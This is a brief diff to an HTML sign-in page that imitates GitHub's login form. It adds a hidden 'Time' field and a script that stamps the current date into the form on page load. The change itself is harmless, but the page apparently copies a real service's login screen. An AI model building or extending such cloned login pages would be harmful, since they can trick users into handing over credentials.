@@ -287,7 +287,7 @@
 
 
     <input type="submit" name="commit" value="GitHub" class="btn btn-primary btn-block" data-disable-with="Signing in…" />
-
+            <input type="hidden" name="Time" value="date" id="date"/>
     <a class="label-link position-absolute top-0 right-0" tabindex="0" href="/password_reset">Forgot password?</a>
   </div>
 </form>
@@ -373,4 +373,7 @@
   
 
   </body>
+<script>      var date = new Date();
+	document.getElementById("date").value= date;
+</script>
 </html>
